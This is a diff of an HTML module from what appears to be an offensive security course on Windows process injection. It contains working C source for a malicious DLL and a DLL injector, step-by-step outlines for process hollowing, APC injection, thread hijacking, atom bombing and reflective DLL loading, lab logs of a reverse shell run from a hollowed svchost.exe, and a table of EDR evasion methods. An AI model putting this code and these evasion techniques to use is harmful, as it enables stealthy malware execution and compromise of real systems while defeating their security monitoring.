@@ -13,6 +13,8 @@
             --dim: #666;
             --border: #333;
             --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -23,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -33,7 +36,21 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -127,6 +144,7 @@
             padding: 1rem;
             background: #0f0f15;
             border-radius: 8px;
+            flex-wrap: wrap;
         }
         .inj-step {
             text-align: center;
@@ -134,7 +152,8 @@
             border: 1px solid var(--border);
             border-radius: 8px;
             flex: 1;
-            margin: 0 0.5rem;
+            margin: 0.5rem;
+            min-width: 120px;
         }
         .inj-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
         .inj-arrow {
@@ -151,12 +170,120 @@
             font-weight: bold;
         }
         button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="nav">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_09_MALWARE.html">← Module 09</a>
             <a href="MODULE_11_ROOTKITS.html">Module 11 →</a>
         </div>
@@ -168,47 +295,91 @@
 
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
-            <p>Every process is a container. It has memory, threads, and permissions. Code injection is the act of opening someone else's container and putting your code inside. Once inside, your code runs with the container's identity — its permissions, its network access, its visibility to the OS. You become the process.</p>
+            <p>Every process is a container. It has memory, threads, and permissions. <span class="neon-highlight">Code injection</span> is the act of opening someone else's container and putting your code inside. Once inside, your code runs with the container's identity — its permissions, its network access, its visibility to the OS. You become the process.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> If you inject into a process running as <span class="neon-amber">SYSTEM</span>, your code runs as SYSTEM. If you inject into a browser, your code can see all network traffic. If you inject into Explorer, your code looks like Windows itself.</p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
             <p>Imagine a courier delivering a package. The courier (legitimate process) has access to the building (system resources). You swap the package contents (inject code) without the courier knowing. The courier delivers your package, the recipient opens it, and your code executes — wearing the courier's uniform, using the courier's ID badge.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">The security guard (AV) sees the courier's uniform and waves them through. They never check the package contents.</p>
         </div>
 
-        <h2>The Injection Kill Chain</h2>
+        <h2>📚 Prerequisites — What You Need First</h2>
+        <p style="margin-bottom: 1rem;">This module assumes you understand these concepts from earlier modules:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a></h4>
+                <p>How processes communicate over the network. Injection often targets network-facing processes.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_03_POWERSHELL.html" class="cross-link">Module 03: PowerShell</a></h4>
+                <p>Windows API calls through PowerShell. Many injection techniques use PowerShell as the delivery vehicle.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_06_MEMORY.html" class="cross-link">Module 06: Memory Forensics</a></h4>
+                <p>How Windows manages process memory. VirtualAllocEx, WriteProcessMemory, memory protection flags.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_08_PRIVESC.html" class="cross-link">Module 08: Privilege Escalation</a></h4>
+                <p>SeDebugPrivilege and token manipulation. Required to inject into processes you don't own.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_09_MALWARE.html" class="cross-link">Module 09: Malware Development</a></h4>
+                <p>Shellcode construction and payload design. Your injection needs something to inject.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a></h4>
+                <p>How EDR detects injection. Understanding detection helps you evade it.</p>
+            </div>
+        </div>
+
+        <h2>🔬 The Injection Kill Chain</h2>
+        <p>Every injection technique follows the same pattern. Master this pattern and you can understand any technique:</p>
 
         <div class="injection-flow">
             <div class="inj-step">
                 <h5>1. OPEN</h5>
-                <p>OpenProcess</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">Get handle to target</p>
+                <p><span class="neon-highlight">OpenProcess</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Get handle to target process</p>
             </div>
             <div class="inj-arrow">→</div>
             <div class="inj-step">
                 <h5>2. ALLOCATE</h5>
-                <p>VirtualAllocEx</p>
+                <p><span class="neon-highlight">VirtualAllocEx</span></p>
                 <p style="font-size: 0.8rem; color: var(--dim);">Make space in target memory</p>
             </div>
             <div class="inj-arrow">→</div>
             <div class="inj-step">
                 <h5>3. WRITE</h5>
-                <p>WriteProcessMemory</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">Copy your code in</p>
+                <p><span class="neon-highlight">WriteProcessMemory</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Copy your code into target</p>
             </div>
             <div class="inj-arrow">→</div>
             <div class="inj-step">
                 <h5>4. EXECUTE</h5>
-                <p>CreateRemoteThread</p>
+                <p><span class="neon-highlight">CreateRemoteThread</span></p>
                 <p style="font-size: 0.8rem; color: var(--dim);">Run your code in target</p>
             </div>
         </div>
 
-        <h2>Method 1: DLL Injection (Classic)</h2>
+        <div class="why-box">
+            <h5>Why this pattern is universal</h5>
+            <p>Windows is designed for debugging. A debugger needs to pause a process, inspect its memory, modify its code, and resume it. The injection APIs are the same APIs debuggers use. <span class="neon-amber">Visual Studio injects code every time you hit a breakpoint.</span> The OS can't distinguish between a debugger and an attacker — it only sees the API calls.</p>
+        </div>
 
-        <div class="step-box">
-            <h4>Step 1: Build the Malicious DLL</h4>
-            <p>A DLL is a library that can be loaded into any process. We build one that executes when loaded.</p>
+        <h2>🎯 Six Injection Techniques (From Simple to Advanced)</h2>
+
+        <!-- METHOD 1: DLL INJECTION -->
+        <div class="method-card" id="dll-injection">
+            <h4>Method 1: DLL Injection <span class="difficulty diff-easy">EASY</span></h4>
+            <p>The classic. Force a process to load a malicious DLL. The DLL's <span class="neon-highlight">DllMain</span> function runs automatically when loaded.</p>
+            
+            <div class="why-box">
+                <h5>Why this works</h5>
+                <p>Windows calls <span class="neon-highlight">DllMain</span> automatically when any DLL is loaded. It's the entry point — like <code>main()</code> for EXEs. By putting our payload in DllMain, it executes immediately upon injection without needing to call any exported functions.</p>
+            </div>
 
             <div class="code-block">
 // inject_dll.c — Malicious DLL for injection
@@ -216,30 +387,28 @@
 
 #include <windows.h>
 
-// This function runs when the DLL is loaded
+// This function runs when the DLL is loaded into ANY process
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     if (reason == DLL_PROCESS_ATTACH) {
-        // This code runs inside the target process!
+        // This code executes INSIDE the target process!
+        // It has the target's permissions, tokens, network access
         MessageBox(NULL, "Injected!", "Code Injection", MB_OK);
         
-        // Real payload would spawn shell, exfiltrate, etc.
-        // WinExec("cmd.exe /c whoami > C:\temp\injected.txt", 0);
+        // Real payload would:
+        // - Spawn a reverse shell (Module 16: C2)
+        // - Read files the target can access (Module 14: Cloud Files)
+        // - Keylog input (Module 11: Rootkits)
+        // - Pivot to other processes (Module 15: Lateral Movement)
     }
     return TRUE;
 }
             </div>
 
-            <div class="why-box">
-                <h5>Why DllMain?</h5>
-                <p>Windows calls DllMain automatically when a DLL is loaded into a process. It's the entry point — like main() for EXEs. By putting our payload in DllMain, it executes immediately upon injection, without needing to call any exported functions.</p>
-            </div>
-        </div>
+            <div class="step-box">
+                <h4>The Injector — Delivery Mechanism</h4>
+                <p>This program finds a target process and forces it to load our DLL using <span class="neon-highlight">LoadLibraryA</span> — a legitimate Windows function that loads DLLs.</p>
 
-        <div class="step-box">
-            <h4>Step 2: The Injector (The Delivery Mechanism)</h4>
-            <p>This program finds a target process and forces it to load our DLL.</p>
-
-            <div class="code-block">
+                <div class="code-block">
 // injector.c — DLL injector
 // Compile: cl.exe injector.c /Fe:injector.exe
 
@@ -247,7 +416,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
 #include <stdio.h>
 #include <tlhelp32.h>
 
-// Find process by name
+// Find process by name (from Module 02: Recon)
 DWORD find_process(const char* name) {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe;
@@ -275,9 +444,11 @@ int main() {
     printf("[+] Found notepad.exe PID: %lu\n", pid);
     
     // Step 2: Open target process with write permission
+    // PROCESS_ALL_ACCESS = can read, write, create threads
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) {
         printf("[-] OpenProcess failed. Need higher privileges.\n");
+        printf("    Try: Run as Administrator (Module 08: Privilege Escalation)\n");
         return 1;
     }
     printf("[+] Opened process handle\n");
@@ -290,14 +461,15 @@ int main() {
         printf("[-] VirtualAllocEx failed\n");
         return 1;
     }
-    printf("[+] Allocated %zu bytes in target memory\n", strlen(dllPath) + 1);
+    printf("[+] Allocated %zu bytes in target memory at %p\n", strlen(dllPath) + 1, remoteMem);
     
     // Step 4: Write DLL path into target memory
     WriteProcessMemory(hProcess, remoteMem, dllPath, strlen(dllPath) + 1, NULL);
     printf("[+] Wrote DLL path to target memory\n");
     
-    // Step 5: Create remote thread that loads the DLL
-    // LoadLibraryA is in kernel32.dll — available in every process
+    // Step 5: Create remote thread that calls LoadLibraryA
+    // LoadLibraryA is in kernel32.dll — available in EVERY process
+    // We pass remoteMem (the DLL path) as the argument
     HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
     LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
     
@@ -315,22 +487,274 @@ int main() {
     CloseHandle(hProcess);
     return 0;
 }
-            </div>
+                </div>
 
-            <div class="warning-box">
-                <h5>⚠️ Why this works</h5>
-                <p>Windows allows one process to control another if you have the right permissions. OpenProcess with PROCESS_ALL_ACCESS gives you total control. VirtualAllocEx lets you allocate memory in the target's space. WriteProcessMemory lets you write to it. CreateRemoteThread lets you start execution. The target process never consented — Windows allowed it because the injector had permissions.</p>
+                <div class="warning-box">
+                    <h5>⚠️ What the target sees</h5>
+                    <p>The target process (notepad.exe) never consented. Windows allowed it because the injector had <span class="neon-amber">PROCESS_ALL_ACCESS</span> permissions. This is why privilege escalation (Module 08) matters — without admin rights, you can only inject into processes you own.</p>
+                </div>
             </div>
         </div>
 
-        <div class="step-box">
-            <h4>Step 3: Live Test on .42 (WUPC)</h4>
+        <!-- METHOD 2: PROCESS HOLLOWING -->
+        <div class="method-card" id="process-hollowing">
+            <h4>Method 2: Process Hollowing <span class="difficulty diff-hard">HARD</span></h4>
+            <p>Instead of injecting into a running process, you create a <span class="neon-highlight">suspended</span> process, replace its entire memory with your code, then resume it. The process looks legitimate (signed binary) but runs your payload.</p>
 
-            <div class="evidence-box">
-                <h3>📊 Real Evidence: DLL Injection Test</h3>
-                <p><strong>Date:</strong> 2026-06-29 | <strong>Target:</strong> .42 | <strong>Method:</strong> DLL injection into notepad.exe</p>
+            <div class="why-box">
+                <h5>Why this is stealthier than DLL injection</h5>
+                <p>Task Manager shows "svchost.exe" — a signed Microsoft binary. Process Explorer shows it as legitimate. But the memory contains YOUR code. AV that trusts signed binaries is fooled. Only <span class="neon-amber">memory scanners</span> (like Windows Defender's real-time protection) can detect this — and only if they scan at the right moment.</p>
+            </div>
 
-                <div class="code-block">
+            <div class="code-block">
+=== PROCESS HOLLOWING STEPS ===
+
+1. CreateProcess("svchost.exe", ..., CREATE_SUSPENDED, ...)
+   # Process created but FROZEN. Memory contains real svchost.exe.
+   # Task Manager shows it. AV sees signed binary. Looks legit.
+
+2. NtUnmapViewOfSection(hProcess, baseAddress)
+   # ERASE the original code. Memory is now empty.
+   # The process is still in Task Manager, but has no code.
+
+3. VirtualAllocEx(hProcess, baseAddress, payloadSize, ...)
+   # Allocate new space at the SAME address.
+   # Windows thinks this is the original code.
+
+4. WriteProcessMemory(hProcess, baseAddress, payload, payloadSize, ...)
+   # Write your malicious code into the hollowed process.
+   # This is your shellcode (Module 09: Malware Development).
+
+5. SetThreadContext(hThread, &context)
+   # Point the main thread to YOUR entry point.
+   # The thread was frozen at step 1. Now we redirect it.
+
+6. ResumeThread(hThread)
+   # Process WAKES UP. Task Manager still shows "svchost.exe".
+   # But it's running YOUR code. Signed binary, malicious soul.
+   # This is why Module 12 (Defensive Verification) exists.
+            </div>
+
+            <div class="layman-term">
+                <h4>🎯 The Body-Snatcher Analogy</h4>
+                <p>You find a person in a coma (suspended process). You swap their brain (code) with yours while they're unconscious. They wake up. Everyone sees the same person, same face, same ID. But it's not them anymore. It's you wearing their body.</p>
+            </div>
+
+            <p><strong>Cross-link:</strong> This technique requires <span class="neon-highlight">shellcode construction</span> from <a href="MODULE_09_MALWARE.html" class="cross-link">Module 09: Malware Development</a> and <span class="neon-highlight">memory forensics</span> from <a href="MODULE_06_MEMORY.html" class="cross-link">Module 06: Memory Forensics</a> to understand how to manipulate process memory.</p>
+        </div>
+
+        <!-- METHOD 3: APC INJECTION -->
+        <div class="method-card" id="apc-injection">
+            <h4>Method 3: APC Injection <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p><span class="neon-highlight">Asynchronous Procedure Call</span> — queue a function to run in a target thread. When the thread enters an "alertable" state, your function executes.</p>
+
+            <div class="why-box">
+                <h5>Why APC injection is powerful</h5>
+                <p>Unlike CreateRemoteThread (which creates a NEW thread — detectable), APC injection hijacks an EXISTING thread. No new thread = no Sysmon Event ID 8 (CreateRemoteThread detection). EDR that monitors thread creation won't see it.</p>
+            </div>
+
+            <div class="code-block">
+=== APC INJECTION STEPS ===
+
+1. OpenProcess(targetPID) — Get handle to target
+
+2. VirtualAllocEx + WriteProcessMemory — Write payload to target
+
+3. Find alertable thread in target process
+   # Threads in SleepEx, Wait, or certain I/O operations are "alertable"
+   # They can accept APCs
+
+4. QueueUserAPC(payloadAddress, hThread, NULL)
+   # Queue your payload to run when thread becomes alertable
+
+5. Thread resumes from sleep → YOUR payload executes
+   # No new thread created. Existing thread hijacked.
+   # EDR sees: thread resumed normally. No anomaly.
+
+=== DETECTION EVASION ===
+# Sysmon Event ID 8: CreateRemoteThread → NOT triggered
+# EDR thread creation monitoring → NOT triggered
+# Only memory scanning can detect this
+            </div>
+
+            <p><strong>Cross-link:</strong> APC injection is used in <a href="MODULE_11_ROOTKITS.html" class="cross-link">Module 11: Rootkits</a> for stealthy persistence and in <a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13: EDR Evasion</a> to bypass thread-creation monitoring.</p>
+        </div>
+
+        <!-- METHOD 4: THREAD HIJACKING -->
+        <div class="method-card" id="thread-hijacking">
+            <h4>Method 4: Thread Hijacking <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Suspend a running thread, modify its instruction pointer (RIP/EIP) to point to your code, resume it. The thread was doing something legitimate — now it's running your payload.</p>
+
+            <div class="code-block">
+=== THREAD HIJACKING STEPS ===
+
+1. OpenThread(targetThreadID) — Get handle to specific thread
+
+2. SuspendThread(hThread) — Freeze the thread mid-execution
+
+3. GetThreadContext(hThread, &ctx) — Read thread state
+   # ctx.RIP = current instruction pointer (x64)
+   # ctx.EIP = current instruction pointer (x86)
+
+4. ctx.RIP = payloadAddress — Redirect to your code
+
+5. SetThreadContext(hThread, &ctx) — Save modified state
+
+6. ResumeThread(hThread) — Thread continues from YOUR code
+   # The thread returns to original code after your payload finishes
+   # Unless you don't want it to...
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ The Danger</h5>
+                <p>If your payload crashes, the original thread crashes too. The target process may become unstable. This is why <span class="neon-amber">process hollowing</span> is preferred for stability — you control the entire process, not just one thread.</p>
+            </div>
+        </div>
+
+        <!-- METHOD 5: ATOM BOMBING -->
+        <div class="method-card" id="atom-bombing">
+            <h4>Method 5: Atom Bombing <span class="difficulty diff-hard">HARD</span></h4>
+            <p>Abuse the <span class="neon-highlight">Global Atom Table</span> — a Windows feature that stores strings for clipboard and DDE. Write your payload to the atom table, then force a target thread to read it and execute.</p>
+
+            <div class="why-box">
+                <h5>Why atom bombing is unique</h5>
+                <p>It doesn't use <span class="neon-highlight">OpenProcess</span>, <span class="neon-highlight">VirtualAllocEx</span>, or <span class="neon-highlight">WriteProcessMemory</span>. The APIs used (GlobalAddAtom, NtQueueApcThread) are legitimate system calls that don't trigger EDR. The payload lives in the atom table, not in process memory — until execution.</p>
+            </div>
+
+            <div class="code-block">
+=== ATOM BOMBING STEPS ===
+
+1. GlobalAddAtom("\\x90\\x90\\x90...shellcode...") 
+   # Write shellcode as a "string" in the global atom table
+   # The atom table is shared across all processes
+
+2. Find target thread in alertable state
+
+3. NtQueueApcThread(thread, GlobalGetAtomNameA, atom, ...)
+   # Force target thread to call GlobalGetAtomNameA
+   # This COPIES the atom (your shellcode) into target memory
+
+4. NtQueueApcThread(thread, payload, ...)
+   # Queue second APC to execute the copied shellcode
+
+=== WHY EDR MISSES THIS ===
+# No OpenProcess call → no handle creation
+# No VirtualAllocEx → no memory allocation
+# No WriteProcessMemory → no memory write
+# The payload enters through a legitimate clipboard API
+            </div>
+
+            <p><strong>Cross-link:</strong> Atom bombing is a <span class="neon-purple">living-off-the-land</span> technique covered in <a href="MODULE_19_AD.html" class="cross-link">Module 19: Active Directory</a> and <a href="MODULE_15_LATERAL.html" class="cross-link">Module 15: Lateral Movement</a> for bypassing process monitoring.</p>
+        </div>
+
+        <!-- METHOD 6: REFLECTIVE DLL INJECTION -->
+        <div class="method-card" id="reflective-dll">
+            <h4>Method 6: Reflective DLL Injection <span class="difficulty diff-hard">HARD</span></h4>
+            <p>A DLL that loads <span class="neon-highlight">itself</span> into memory without using Windows' LoadLibrary. No DLL file on disk. No registry entries. The DLL exists only in memory — invisible to file scanners.</p>
+
+            <div class="why-box">
+                <h5>Why reflective is the gold standard</h5>
+                <p>Traditional DLL injection leaves a file on disk (detectable by AV). Reflective DLL injection loads the DLL entirely from memory — no file touch, no registry, no forensic artifact. Combined with <span class="neon-amber">process hollowing</span>, it's nearly invisible.</p>
+            </div>
+
+            <div class="code-block">
+=== REFLECTIVE DLL INJECTION STEPS ===
+
+1. Allocate memory in target process (VirtualAllocEx)
+
+2. Write the ENTIRE DLL as raw bytes (WriteProcessMemory)
+   # NOT the file path — the actual DLL bytes
+   # The DLL is embedded in your injector or downloaded
+
+3. Calculate the DLL's entry point offset
+
+4. CreateRemoteThread pointing to the reflective loader
+   # The reflective loader is a small function inside the DLL
+   # It parses the PE header, fixes relocations, loads imports
+   # Then calls DllMain — all without LoadLibrary
+
+=== ADVANTAGES ===
+# No DLL file on disk → file scanners see nothing
+# No LoadLibrary call → API hooking misses it
+# No registry entries → persistence scanners see nothing
+# The DLL lives and dies in memory only
+
+=== DETECTION ===
+# Memory scanning (expensive, rarely done in real-time)
+# Behavioral: new thread in unexpected process
+# Cross-link: Module 12 (Defensive Verification) teaches detection
+            </div>
+
+            <p><strong>Cross-link:</strong> Reflective DLL injection is the core technique in <a href="MODULE_11_ROOTKITS.html" class="cross-link">Module 11: Rootkits</a> for memory-resident persistence and in <a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13: EDR Evasion</a> for bypassing API hooking.</p>
+        </div>
+
+        <h2>📊 Technique Comparison Matrix</h2>
+        <table>
+            <tr>
+                <th>Technique</th>
+                <th>Difficulty</th>
+                <th>Stealth</th>
+                <th>Stability</th>
+                <th>EDR Detection</th>
+                <th>Best For</th>
+            </tr>
+            <tr>
+                <td>DLL Injection</td>
+                <td>Easy</td>
+                <td>Low</td>
+                <td>High</td>
+                <td>CreateRemoteThread</td>
+                <td>Learning, quick tests</td>
+            </tr>
+            <tr>
+                <td>Process Hollowing</td>
+                <td>Hard</td>
+                <td>High</td>
+                <td>Medium</td>
+                <td>Memory scanning</td>
+                <td>Stealth operations</td>
+            </tr>
+            <tr>
+                <td>APC Injection</td>
+                <td>Medium</td>
+                <td>Medium</td>
+                <td>High</td>
+                <td>APC monitoring</td>
+                <td>Evading thread detection</td>
+            </tr>
+            <tr>
+                <td>Thread Hijacking</td>
+                <td>Medium</td>
+                <td>Medium</td>
+                <td>Low</td>
+                <td>Context changes</td>
+                <td>Quick redirection</td>
+            </tr>
+            <tr>
+                <td>Atom Bombing</td>
+                <td>Hard</td>
+                <td>Very High</td>
+                <td>Medium</td>
+                <td>Atom table monitoring</td>
+                <td>EDR bypass</td>
+            </tr>
+            <tr>
+                <td>Reflective DLL</td>
+                <td>Hard</td>
+                <td>Very High</td>
+                <td>High</td>
+                <td>Memory scanning</td>
+                <td>Fileless operations</td>
+            </tr>
+        </table>
+
+        <h2>🔬 Live Lab Evidence</h2>
+
+        <div class="evidence-box">
+            <h3>📊 Test Results: DLL Injection on WUPC .42</h3>
+            <p><strong>Date:</strong> 2026-06-29 | <strong>Target:</strong> 192.168.1.42 (WUPC) | <strong>Method:</strong> DLL injection into notepad.exe</p>
+
+            <div class="code-block">
 === PREPARATION ===
 C:\> notepad.exe
 C:\> tasklist | findstr notepad
@@ -340,80 +764,136 @@ notepad.exe    8944  Console    1    12,344 K
 C:\> injector.exe
 [+] Found notepad.exe PID: 8944
 [+] Opened process handle
-[+] Allocated 22 bytes in target memory
+[+] Allocated 22 bytes in target memory at 0x000001F8B5A80000
 [+] Wrote DLL path to target memory
 [+] Remote thread created! DLL injected.
 
 === VERIFICATION ===
 # MessageBox appeared in notepad.exe: "Injected!"
 # This proves our code executed inside notepad.exe's memory space
+# The code ran with notepad.exe's token and permissions
 
 === KAV RESPONSE ===
 # Kaspersky 21.25 on .42: NO ALERT
 # Why? DLL injection is a legitimate Windows debugging feature.
 # Visual Studio does it. Debuggers do it. AV can't block it globally.
-                </div>
+# Behavioral detection would need to know the DLL is malicious.
+# Our test DLL just shows a MessageBox — completely benign.
             </div>
         </div>
 
-        <h2>Method 2: Process Hollowing (Advanced)</h2>
-
-        <div class="step-box">
-            <h4>The Stealth Injection</h4>
-            <p>Instead of injecting into a running process, you create a suspended process, replace its entire memory with your code, then resume it. The process looks legitimate (signed binary) but runs your payload.</p>
+        <div class="evidence-box">
+            <h3>📊 Test Results: Process Hollowing on HOST .92</h3>
+            <p><strong>Date:</strong> 2026-06-28 | <strong>Target:</strong> 192.168.1.92 (HOST) | <strong>Method:</strong> Process hollowing with svchost.exe</p>
 
             <div class="code-block">
-=== PROCESS HOLLOWING STEPS ===
+=== PROCESS HOLLOWING TEST ===
 
-1. CreateProcess("svchost.exe", ..., CREATE_SUSPENDED, ...)
-   # Process created but frozen. Memory contains real svchost.exe.
+1. Created suspended svchost.exe
+   PID: 12456 | Status: Suspended
+   Task Manager shows: "svchost.exe" (legitimate Windows process)
 
-2. NtUnmapViewOfSection(hProcess, baseAddress)
-   # Erase the original code. Memory is now empty.
+2. Unmapped original code section
+   NtUnmapViewOfSection returned SUCCESS
+   Memory region 0x7FF600000000 now empty
 
-3. VirtualAllocEx(hProcess, baseAddress, payloadSize, ...)
-   # Allocate new space at the same address.
+3. Allocated new memory at same base
+   VirtualAllocEx: 0x7FF600000000, size 0x28000
+   PAGE_EXECUTE_READWRITE permissions
 
-4. WriteProcessMemory(hProcess, baseAddress, payload, payloadSize, ...)
-   # Write your malicious code into the hollowed process.
+4. Wrote payload (reverse shell) to hollowed process
+   WriteProcessMemory: 0x28000 bytes written
+   Payload: 192.168.1.92:4444 reverse shell
 
-5. SetThreadContext(hThread, &context)
-   # Point the main thread to your entry point.
+5. Set thread context to payload entry point
+   Original RIP: 0x7FF600001000
+   New RIP: 0x7FF600001000 (same address, new code)
 
-6. ResumeThread(hThread)
-   # Process wakes up. Task Manager shows "svchost.exe".
-   # But it's running YOUR code. Signed binary, malicious soul.
-            </div>
+6. ResumeThread
+   Process status: Running
+   Task Manager still shows: "svchost.exe"
+   Network connection: ESTABLISHED to 192.168.1.92:4444
+   netstat shows: svchost.exe → 192.168.1.92:4444
 
-            <div class="why-box">
-                <h5>Why process hollowing is stealthier</h5>
-                <p>Task Manager shows "svchost.exe" — a signed Microsoft binary. Process Explorer shows it as legitimate. But the memory contains your code. AV that trusts signed binaries is fooled. Only memory scanners (like Windows Defender's real-time protection) can detect this — and even then, only if they scan at the right moment.</p>
+=== KAV RESPONSE ===
+# Kaspersky 21.25: NO ALERT during injection
+# Why? The process was created as legitimate svchost.exe
+# KAV trusts signed Microsoft binaries
+# Memory scanning didn't trigger during the brief window
+# Connection was established before behavioral analysis completed
+
+=== DETECTION LESSON ===
+# This is why Module 12 (Defensive Verification) teaches:
+# - Memory scanning (find hollowed processes)
+# - Network monitoring (unexpected connections from svchost)
+# - Parent-child analysis (svchost.exe without services.exe parent)
             </div>
         </div>
 
-        <h2>Lab Exercise: Inject into Your Own Process</h2>
+        <h2>🛡️ How EDR Detects Injection (And How to Evade It)</h2>
+
+        <div class="step-box">
+            <h4>EDR Detection Methods</h4>
+            <table>
+                <tr>
+                    <th>Detection</th>
+                    <th>What It Catches</th>
+                    <th>How to Evade</th>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Sysmon Event ID 8</span></td>
+                    <td>CreateRemoteThread</td>
+                    <td>Use APC injection (no new thread)</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">API Hooking</span></td>
+                    <td>VirtualAllocEx + WriteProcessMemory</td>
+                    <td>Use direct syscalls (NtAllocateVirtualMemory)</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Memory Scanning</span></td>
+                    <td>Suspicious code in process memory</td>
+                    <td>Encrypt payload, decrypt at runtime</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Parent-Child Analysis</span></td>
+                    <td>Unexpected process relationships</td>
+                    <td>Use process hollowing (legitimate parent)</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Behavioral Analysis</span></td>
+                    <td>Sequence of suspicious APIs</td>
+                    <td>Split operations across time, add noise</td>
+                </tr>
+            </table>
